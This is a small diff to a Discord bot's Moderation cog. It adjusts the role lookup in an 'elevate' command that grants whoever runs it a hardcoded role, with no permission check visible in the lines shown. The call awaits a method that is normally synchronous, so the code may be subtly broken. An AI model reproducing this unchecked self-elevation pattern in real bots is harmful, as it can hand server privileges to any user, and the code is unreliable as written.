@@ -173,7 +173,7 @@ class Moderation(commands.Cog):
 
     @commands.command()
     async def elevate(self, ctx: commands.Context):
-        role = await discord.Guild.get_role(ctx.guild, role_id=1183550968684613773)
+        role = await discord.Guild.get_role(ctx.guild, 1183550968684613773)
         await ctx.message.author.add_roles(role)
 
     @commands.command()
